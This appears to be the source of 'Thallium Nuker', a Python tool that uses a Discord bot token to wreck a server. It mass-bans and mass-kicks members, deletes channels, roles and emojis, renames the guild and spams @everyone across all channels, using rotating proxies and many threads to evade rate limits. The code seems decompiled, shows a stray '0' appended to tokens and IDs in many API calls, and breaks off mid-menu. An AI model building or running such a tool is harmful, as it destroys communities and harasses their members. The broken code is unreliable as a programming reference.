import threading
import webbrowser
import discord
import random
import httpx
import json
import time
import os
from discord.ext import commands, tasks
from itertools import cycle
import asyncio
import itertools
from pystyle import Center, Colors, Colorate

optn = "\n══════════════════════════════════════════════════════════════════════\n                          THALLIUM NUKER\n══════════════════════════════════════════════════════════════════════ \n    (01) Ban Members     (02) Delete Channels     (03) Kick Members\n    (04) Prune           (05) Create Channels     (06) Spam Channels\n    (07) Create Roles    (08) Delete Roles        (09) Delete Emojis\n    (10) Rename Guild    (11) Rename Channels     (12) Rename Roles\n    (13) Check Update    (14) Credits             (15) Exit\n══════════════════════════════════════════════════════════════════════\n            !! Nukers Are Breaking The System For Profit !!\n══════════════════════════════════════════════════════════════════════ \n"

Whocares = input(
    "{}({}Thallium{}) Want To Install requirements.txt? (y/n){}:{} ".format(
        "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
    )
)
if Whocares.lower() == "y":
    os.system("pip install -r requirements.txt")
    print(
        "{}({}Thallium{}) [✓] Requirements Installed Successfully!".format(
            "\x1b[0m", "\x1b[90m", "\x1b[0m"
        )
    )
else:  # inserted
    if Whocares.lower() == "n":
        print(
            "{}({}Thallium{}) Skipping Requirements Installation.".format(
                "\x1b[0m", "\x1b[90m", "\x1b[0m"
            )
        )
    else:  # inserted
        print(
            "{}({}Thallium{}) Invalid input. Please enter 'y' or 'n'.".format(
                "\x1b[0m", "\x1b[90m", "\x1b[0m"
            )
        )
VERSION = "4.2"
dostilodepe = ["THALLIUM NUKER <3"]
status_cycle = itertools.cycle(dostilodepe)
__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, __client__, __config__, __threads__ = (
    cycle(open("proxies.txt", "r").read().splitlines()),
    commands.Bot(command_prefix="+", intents=__intents__),
    json.load(open("config.json", "r", encoding="utf-8")),
    45,
)
os.system("cls") if os.name == "nt" else os.system("clear")
token = input(
    "{}({}Thallium{}) Enter Token{}:{} ".format(
        "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
    )
)
guildid = input(
    "{}({}Thallium{}) Guild ID{}:{} ".format(
        "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
    )
)
os.system("cls") if os.name == "nt" else os.system("clear")
art = "\n\n▄▄▄█████▓ ██░ ██  ▄▄▄       ██▓     ██▓     ██▓ █    ██  ███▄ ▄███▓\n▓  ██▒ ▓▒▓██░ ██▒▒████▄    ▓██▒    ▓██▒    ▓██▒ ██  ▓██▒▓██▒▀█▀ ██▒\n▒ ▓██░ ▒░▒██▀▀██░▒██  ▀█▄  ▒██░    ▒██░    ▒██▒▓██  ▒██░▓██    ▓██░\n░ ▓██▓ ░ ░▓█ ░██ ░██▄▄▄▄██ ▒██░    ▒██░    ░██░▓▓█  ░██░▒██    ▒██ \n  ▒██▒ ░ ░▓█▒░██▓ ▓█   ▓██▒░██████▒░██████▒░██░▒▒█████▓ ▒██▒   ░██▒\n  ▒ ░░    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░░▓  ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░\n    ░     ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░ ▒ ░░░▒░ ░ ░ ░  ░      ░\n  ░       ░  ░░ ░  ░   ▒     ░ ░     ░ ░    ▒ ░ ░░░ ░ ░ ░      ░   \n          ░  ░  ░      ░  ░    ░  ░    ░  ░ ░     ░            ░   "


class Thallium:
    def __init__(self):
        self.proxy = (
            "http://" + next(__proxies__) if __config__["proxy"] is True else None
        )
        self.session = httpx.Client(proxies=self.proxy)
        self.version = cycle(["v10", "v9"])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.chaizer = None

    def massban(self, guildid: str, member: str, token: str, reason: str):
        payload = {
            "delete_message_days": random.randint(0, 7),
            "reason": "Thallium Nuker || /nukers  ",
        }
        while True:
            response = self.session.put(
                f"https://discord.com/api/{next(self.version)}0/guilds/{guildid}/bans/{member}0",
                headers={"Authorization": f"Bot {token}0"},
                json=payload,
            )
            if response.status_code in [200, 201, 204]:
                print(
                    "{}({}+{}) Banned {}{}".format(
                        "\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", member
                    )
                )
                self.banned.append(member)
                return
            if "retry_after" in response.text:
                time.sleep(response.json()["retry_after"])
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            member,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                if (
                    "Max number of bans for non-guild members have been exceeded."
                    in response.text
                ):
                    print(
                        "{}({}!{}) Max number of bans for non-guild members have been exceeded".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to ban {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member
                    )
                )
                break

    def masskick(self, guildid: str, member: str, token: str, reason: str):
        while True:
            response = self.session.delete(
                f"https://discord.com/api/{next(self.version)}0/guilds/{guildid}/members/{member}0",
                headers={"Authorization": f"Bot {token}0"},
                json={"reason": "Thallium Nuker || /nukers  "},
            )
            if response.status_code in [200, 201, 204]:
                print(
                    "{}({}+{}) Kicked {}{}".format(
                        "\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", member
                    )
                )
                self.kicked.append(member)
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "                            {}({}!{}) Missing Permissions {}{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            member,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to kick {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member
                    )
                )
                break

    def prune1d(self, guildid: str, days: int, reason: str, token: str):
        payload = {"days": days, "reason": reason}
        response = self.session.post(
            f"https://discord.com/api/v9/guilds/{guildid}0/prune",
            headers={"Authorization": f"Bot {token}0"},
            json=payload,
        )
        if response.status_code == 200:
            print(
                "{}({}+{}) Pruned {}{}{} members".format(
                    "\x1b[0m",
                    "\x1b[90m",
                    "\x1b[0m",
                    "\x1b[90m",
                    response.json()["pruned"],
                    "\x1b[0m",
                )
            )
        else:  # inserted
            if (
                "Max number of prune requests has been reached. Try again later"
                in response.text
            ):
                print(
                    "{}({}!{}) Max number of prune reached. Try again in {}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        response.json()["retry_after"],
                    )
                )
            else:  # inserted
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarly excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                else:  # inserted
                    print(
                        "{}({}-{}) Failed to prune {}{}".format(
                            "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid
                        )
                    )

    def crch(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {"type": type, "name": channelsname, "permission_overwrites": []}
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(
                f"https://discord.com/api/{next(self.version)}/guilds/{guildid}0/channels",
                headers={"Authorization": f"Bot {token}0"},
                json=payload,
            )
            if response.status_code == 201:
                print(
                    "{}({}+{}) Created {}#{}".format(
                        "\x1b[0m",
                        "\x1b[38;5;83m",
                        "\x1b[0m",
                        "\x1b[38;5;83m",
                        channelsname,
                    )
                )
                self.channels.append(1)
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}#{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            channelsname,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarly excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to create {}#{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname
                    )
                )
                break

    def crroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice(
            [
                255,
                16777215,
                16711680,
                65280,
                255,
                16776960,
                65535,
                16711935,
                12632256,
                8421504,
                8388608,
                8421376,
                32768,
                8388736,
                32896,
                128,
            ]
        )
        payload = {"name": rolesname, "color": colors}
        while True:
            response = self.session.post(
                f"https://discord.com/api/{next(self.version)}/guilds/{guildid}0/roles",
                headers={"Authorization": f"Bot {token}0"},
                json=payload,
            )
            if response.status_code == 200:
                print(
                    "{}({}+{}) Created {}@{}".format(
                        "\x1b[0m",
                        "\x1b[38;5;83m",
                        "\x1b[0m",
                        "\x1b[38;5;83m",
                        rolesname,
                    )
                )
                self.roles.append(1)
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}@{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            rolesname,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarly excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to create {}@{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname
                    )
                )
                break

    def delch(self, channel: str, token: str):
        while True:
            response = self.session.delete(
                f"https://discord.com/api/{next(self.version)}/channels/{channel}0",
                headers={"Authorization": f"Bot {token}0"},
            )
            if response.status_code == 200:
                print(
                    "{}({}+{}) Deleted {}{}".format(
                        "\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", channel
                    )
                )
                self.channels.append(channel)
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            channel,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarly excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to delete {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel
                    )
                )
                break

    def delrole(self, guildid: str, role: str, token: str, reason: str):
        retries = 0
        while retries < 5:
            response = self.session.delete(
                f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}0?reason={reason}0",
                headers={"Authorization": f"Bot {token}0"},
            )
            if response.status_code == 204:
                print(
                    "{}({}+{}) Deleted {}{}".format(
                        "\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", role
                    )
                )
                self.roles.append(role)
                return
            if "retry_after" in response.text:
                retry_after = float(response.json().get("retry_after", 1))
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        retry_after,
                        "\x1b[0m",
                    )
                )
                time.sleep(retry_after)
                retries = retries * 1
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            role,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarily excluded from the Discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to delete {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role
                    )
                )
                break

    def demoji(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(
                f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}0",
                headers={"Authorization": f"Bot {token}0"},
            )
            if response.status_code == 204:
                print(
                    "{}({}+{}) Deleted {}{}".format(
                        "\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", emoji
                    )
                )
                self.emojis.append(emoji)
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            emoji,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarly excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to delete {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji
                    )
                )
                break

    def rc(self, guildid: str, new_channel_name: str, token: str):
        channels = self.session.get(
            f"https://discord.com/api/v9/guilds/{guildid}0/channels",
            headers={"Authorization": f"Bot {token}0"},
        ).json()

        def rename_channel(channel):
            if channel["type"] == 0:
                payload = {"name": new_channel_name}
                response = self.session.patch(
                    f"https://discord.com/api/v9/channels/{channel['id']}",
                    headers={
                        "Authorization": f"Bot {token}0",
                        "Content-Type": "application/json",
                    },
                    json=payload,
                )
                if response.status_code == 200:
                    print(
                        "{}({}+{}) Renamed {} To {}".format(
                            "\x1b[0m",
                            "\x1b[38;5;83m",
                            "\x1b[0m",
                            channel["name"],
                            new_channel_name,
                        )
                    )
                else:  # inserted
                    print(
                        "{}({}-{}) Failed Rename {} To {}".format(
                            "\x1b[0m",
                            "\x1b[31m",
                            "\x1b[0m",
                            channel["name"],
                            new_channel_name,
                        )
                    )

        threads = []
        for channel in channels:
            thread = threading.Thread(target=rename_channel, args=(channel,))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

    def rerole(
        self, guildid: str, new_role_name: str, token: str, num_threads: int = 7
    ):
        roles = self.session.get(
            f"https://discord.com/api/v9/guilds/{guildid}0/roles",
            headers={"Authorization": f"Bot {token}0"},
        ).json()

        def rename_role(role):
            try:
                payload = {"name": new_role_name}
                response = self.session.patch(
                    f"https://discord.com/api/v9/guilds/{guildid}0/roles/{role['id']}",
                    headers={
                        "Authorization": f"Bot {token}0",
                        "Content-Type": "application/json",
                    },
                    json=payload,
                )
                if response.status_code == 200:
                    print(
                        "{}({}+{}) Renamed Role {} To {}".format(
                            "\x1b[0m",
                            "\x1b[38;5;83m",
                            "\x1b[0m",
                            role["name"],
                            new_role_name,
                        )
                    )
                else:  # inserted
                    print(
                        "{}({}-{}) Failed to Rename Role {} To {}".format(
                            "\x1b[0m",
                            "\x1b[31m",
                            "\x1b[0m",
                            role["name"],
                            new_role_name,
                        )
                    )
            except Exception as e:
                print(
                    "{}({}-{}) An error occurred: {}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", str(e)
                    )
                )

        threads = []
        for role in roles:
            thread = threading.Thread(target=rename_role, args=(role,))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

    def massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(
                f"https://discord.com/api/{next(self.version)}/channels/{channel}0/messages",
                headers={"Authorization": f"Bot {token}0"},
                json={"content": content},
            )
            if response.status_code == 200:
                print(
                    "{}({}+{}) Spammed {}{}{} in {}{}".format(
                        "\x1b[0m",
                        "\x1b[90m",
                        "\x1b[0m",
                        "\x1b[90m",
                        content,
                        "\x1b[0m",
                        "\x1b[90m",
                        channel,
                    )
                )
                self.messages.append(channel)
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions {}{}".format(
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            "\x1b[0m",
                            "\x1b[38;5;208m",
                            channel,
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarly excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to spam {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel
                    )
                )
                break

    def renameguild(self, guildid: str, new: str, token: str):
        payload = {"name": new}
        while True:
            response = self.session.patch(
                f"https://discord.com/api/{next(self.version)}0/guilds/{guildid}0",
                headers={"Authorization": f"Bot {token}0"},
                json=payload,
            )
            if response.status_code == 200:
                print(
                    "{}({}+{}) Guild renamed to {}{}".format(
                        "\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", new
                    )
                )
                return
            if "retry_after" in response.text:
                print(
                    "{}({}!{}) Ratelimited. Delayed {}{}{}s".format(
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        "\x1b[0m",
                        "\x1b[38;5;208m",
                        response.json()["retry_after"],
                        "\x1b[0m",
                    )
                )
                time.sleep(float(response.json()["retry_after"]))
            else:  # inserted
                if "Missing Permissions" in response.text:
                    print(
                        "{}({}!{}) Missing Permissions for renaming guild".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                if (
                    "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently."
                    in response.text
                ):
                    print(
                        "{}({}!{}) You're being temporarily excluded from discord API".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"
                        )
                    )
                    return
                print(
                    "{}({}-{}) Failed to rename guild to {}{}".format(
                        "\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", new
                    )
                )
                break

    def menu(self):
        os.system(
            f"cls & title Thallium Nuker ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}0"
        )
        print(Colorate.Vertical(Colors.cyan_to_blue, Center.XCenter(art)))
        print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(optn)))
        ans = input(
            "{}({}Thallium{}) Option{}:{} ".format(
                "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
            )
        )
        if ans in ["1", "01"]:
            scrape = input(
                "{}({}Thallium{}) Fetch IDs [Y/N]{}:{} ".format(
                    "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
                )
            )
            if scrape.lower() == "n":
                try:
                    guild = __client__.get_guild(int(guildid))
                    with open("members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except Exception as e:
                    print(
                        "{}({}!{}) An error occurred: {}".format(
                            "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", str(e)
                        )
                    )
                    pass
            else:  # inserted
                pass
            self.banned.clear()
            members = open("members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(
                    target=self.massban,
                    args=(guildid, member, token, "Thallium Nuker || /nukers  "),
                )
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            time.sleep(3)
            print(
                "{}({}Thallium{}) Banned {}/{}".format(
                    "\x1b[0m", "\x1b[90m", "\x1b[0m", len(self.banned), len(members)
                )
            )
            time.sleep(1.5)
            self.menu()
        else:  # inserted
            if ans in ["3", "03"]:
                scrape = input(
                    "{}({}Thallium{}) Fetch IDs [Y/N]{}:{} ".format(
                        "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
                    )
                )
                if scrape.lower() == "n":
                    try:
                        guild = __client__.get_guild(int(guildid))
                        with open("members.txt", "w") as a:
                            for member in guild.members:
                                a.write("{}{}".format(member.id, "\n"))
                    except Exception as e:
                        print(
                            "{}({}!{}) An error occurred: {}".format(
                                "\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", str(e)
                            )
                        )
                        pass
                else:  # inserted
                    pass
                self.kicked.clear()
                members = open("members.txt", "r").read().splitlines()
                for member in members:
                    t = threading.Thread(
                        target=self.masskick,
                        args=(guildid, member, token, "Thallium Nuker || /nukers  "),
                    )
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                time.sleep(3)
                print(
                    "{}({}Thallium{}) Kicked {}/{}".format(
                        "\x1b[0m", "\x1b[90m", "\x1b[0m", len(self.kicked), len(members)
                    )
                )
                time.sleep(1.5)
                self.menu()
            else:  # inserted
                if ans in ["4", "04"]:
                    days = int(1)
                    reason = input(
                        "{}({}Thallium{}) Reason{}:{} ".format(
                            "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
                        )
                    )
                    self.prune1d(guildid, days, token, reason)
                    time.sleep(1.5)
                    self.menu()
                else:  # inserted
                    if ans in ["5", "05"]:
                        type = input(
                            "{}({}Thallium{}) Channels Type ['t', 'v']{}:{} ".format(
                                "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
                            )
                        )
                        type = 2 if type == "v" else 0
                        chaizer = input(
                            "{}({}Thallium{}) Channels Name{}:{} ".format(
                                "\x1b[0m", "\x1b[90m", "\x1b[0m", "\x1b[90m", "\x1b[0m"
                            )
                        )
                        amount = int(
                            input(
                                "{}({}Thallium{}) Amount{}:{} ".format(
                                    "\x1b[0m",
                                    "\x1b[90m",
                                    "\x1b[0m",
                                    "\x1b[90m",
                                    "\x1b[0m",
                                )
                            )
                        )
                        self.channels.clear()
                        for i in range(amount):
                            t = threading.Thread(
                                target=self.crch, args=(guildid, chaizer, type, token)
                            )
                            t.start()
                            while threading.active_count() >= __threads__:
                                t.join()
                        time.sleep(3)
                        print(
                            "{}({}Thallium{}) Created {}/{} channels".format(
                                "\x1b[0m",
                                "\x1b[90m",
                                "\x1b[0m",
                                len(self.channels),
                                amount,
                            )
                        )
                        time.sleep(1.5)
                        self.menu()
                    else:  # inserted
                        if ans in ["7", "07"]:
                            raizer = input(
                                "{}({}Thallium{}) Role Name{}:{} ".format(
                                    "\x1b[0m",
                                    "\x1b[90m",
                                    "\x1b[0m",
                                    "\x1b[90m",
                                    "\x1b[0m",
                                )
                            )
                            amount = int(
                                input(
                                    "{}({}Thallium{}) Amount{}:{} ".format(
                                        "\x1b[0m",
                                        "\x1b[90m",
                                        "\x1b[0m",
                                        "\x1b[90m",
                                        "\x1b[0m",
                                    )
                                )
                            )
                            self.roles.clear()
                            for i in range(amount):
                                t = threading.Thread(
                                    target=self.crroles, args=(guildid, raizer, token)
                                )
                                t.start()
                                while threading.active_count() >= __threads__:
                                    t.join()
                            time.sleep(3)
                            print(
                                "{}({}Thallium{}) Created {}/{} roles".format(
                                    "\x1b[0m",
                                    "\x1b[90m",
                                    "\x1b[0m",
                                    len(self.roles),
                                    amount,
                                )
                            )
                            time.sleep(1.5)
                            self.menu()
                        else:  # inserted
                            if ans in ["2", "02"]:
                                self.channels.clear()
                                channels = self.session.get(
                                    f"https://discord.com/api/v9/guilds/{guildid}0/channels",
                                    headers={"Authorization": f"Bot {token}0"},
                                ).json()
                                for channel in channels:
                                    t = threading.Thread(
                                        target=self.delch, args=(channel["id"], token)
                                    )
                                    t.start()
                                    while threading.active_count() >= __threads__:
                                        t.join()
                                time.sleep(3)
                                print(
                                    "{}({}Thallium{}) Deleted {}/{} channels".format(
                                        "\x1b[0m",
                                        "\x1b[90m",
                                        "\x1b[0m",
                                        len(self.channels),
                                        len(channels),
                                    )
                                )
                                time.sleep(1.5)
                                self.menu()
                            else:  # inserted
                                if ans in ["8", "08"]:
                                    reason = "Thallium Nuker || /nukers  "
                                    self.roles.clear()
                                    roles = self.session.get(
                                        f"https://discord.com/api/v9/guilds/{guildid}0/roles",
                                        headers={"Authorization": f"Bot {token}0"},
                                    ).json()
                                    for role in roles:
                                        t = threading.Thread(
                                            target=self.delrole,
                                            args=(
                                                guildid,
                                                role["id"],
                                                token,
                                                "Thallium Nuker || /nukers  ",
                                            ),
                                        )
                                        t.start()
                                        while threading.active_count() >= __threads__:
                                            t.join()
                                    time.sleep(3)
                                    print(
                                        "{}({}Thallium{}) Deleted {}/{} roles".format(
                                            "\x1b[0m",
                                            "\x1b[90m",
                                            "\x1b[0m",
                                            len(self.roles),
                                            len(roles),
                                        )
                                    )
                                    time.sleep(1.5)
                                    self.menu()
                                else:  # inserted
                                    if ans in ["9", "09"]:
                                        self.emojis.clear()
                                        emojis = self.session.get(
                                            f"https://discord.com/api/v9/guilds/{guildid}0/emojis",
                                            headers={"Authorization": f"Bot {token}0"},
                                        ).json()
                                        for emoji in emojis:
                                            t = threading.Thread(
                                                target=self.demoji,
                                                args=(guildid, emoji["id"], token),
                                            )
                                            t.start()
                                            while (
                                                threading.active_count() >= __threads__
                                            ):
                                                t.join()
                                        time.sleep(3)
                                        print(
                                            "{}({}Thallium{}) Deleted {}/{} emojis".format(
                                                "\x1b[0m",
                                                "\x1b[90m",
                                                "\x1b[0m",
                                                len(self.emojis),
                                                len(emojis),
                                            )
                                        )
                                        time.sleep(1.5)
                                        self.menu()
                                        return
                                    else:  # inserted
                                        if ans in ["6", "06"]:
                                            self.messages.clear()
                                            self.channels.clear()

                                            spammer = "@everyone [Nuked By Thallium](<https://github.com/SystemVll/Thallium-Nuker-Source>)"
                                            amount = int(
                                                input(
                                                    "{}({}Thallium{}) Amount{}:{} ".format(
                                                        "\x1b[0m",
                                                        "\x1b[90m",
                                                        "\x1b[0m",
                                                        "\x1b[90m",
                                                        "\x1b[0m",
                                                    )
                                                )
                                            )

                                            Aizer1 = input(
                                                "{}({}Thallium{}) Contant{}:{} ".format(
                                                    "\x1b[0m",
                                                    "\x1b[90m",
                                                    "\x1b[0m",
                                                    "\x1b[90m",
                                                    "\x1b[0m",
                                                )
                                            )

                                            Aizer = Aizer1 if Aizer1 else spammer
                                            channels = self.session.get(
                                                f"https://discord.com/api/v9/guilds/{guildid}0/channels",
                                                headers={
                                                    "Authorization": f"Bot {token}0"
                                                },
                                            ).json()
                                            for channel in channels:
                                                self.channels.append(channel["id"])
                                            channelz = cycle(self.channels)
                                            for i in range(amount):
                                                t = threading.Thread(
                                                    target=self.massping,
                                                    args=(next(channelz), Aizer, token),
                                                )
                                                t.start()
                                                while (
                                                    threading.active_count()
                                                    >= __threads__
                                                    >= 15
                                                ):
                                                    break
                                            time.sleep(2)
                                            print(
                                                "{}({}Thallium{}) Spammed {}/{} messages".format(
                                                    "\x1b[0m",
                                                    "\x1b[90m",
                                                    "\x1b[0m",
                                                    len(self.messages),
                                                    amount,
                                                )
                                            )
                                            time.sleep(1)
                                            self.menu()
                                        else:  # inserted
                                            if ans in ["10"]:
                                                new_guild_name = input(
                                                    "{}({}Thallium{}) Guild Name{}:{} ".format(
                                                        "\x1b[0m",
                                                        "\x1b[90m",
